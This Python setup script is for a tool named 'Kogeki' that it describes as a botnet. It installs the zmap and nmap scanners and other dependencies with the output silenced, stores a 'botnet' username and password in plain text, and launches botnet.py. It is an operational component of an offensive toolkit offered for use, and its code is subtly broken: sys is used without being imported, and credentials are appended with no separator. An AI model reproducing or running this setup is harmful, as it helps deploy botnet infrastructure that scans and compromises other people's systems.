import os
from colorama import Fore, Style
import platform
import os
from time import sleep
oss = platform.version()

if "Debian" in oss or "Ubuntu" in oss or "ubuntu" in oss or "debian" in oss or "Kali" in oss or "Parrot" in oss:
  commands = str('''
  apt-get install zmap -y > /dev/null
  apt-get install nmap -y > /dev/null
  apt-get install screen -y > /dev/null
  apt-get install python3 -y > /dev/null
  apt-get install python3-pip -y > /dev/null
  apt-get install python -y > /dev/null
  apt-get install python-pip -y > /dev/null
  ''')
elif "Centos" in oss or "centos" in oss:
  commands = str('''
  yum install zmap -y > /dev/null
  yum install nmap -y > /dev/null
  yum install screen -y > /dev/null
  yum install python3 -y > /dev/null
  yum install python3-pip -y > /dev/null
  yum install python -y > /dev/null
  yum install python-pip -y > /dev/null
  ''')
else:
  print("Kogeki doesn't support your system!")
  sys.exit()
   
print(Fore.YELLOW + "Installing everything you need!")
os.system(commands)
os.system("pip3 install -r requirements.txt")
username = input("Enter your username for the botnet: ")
password = input("Enter your password for the botnet: ")
with open("auth.txt", "a") as f:
  f.write(username + "," + password)
os.system("python3 botnet.py")


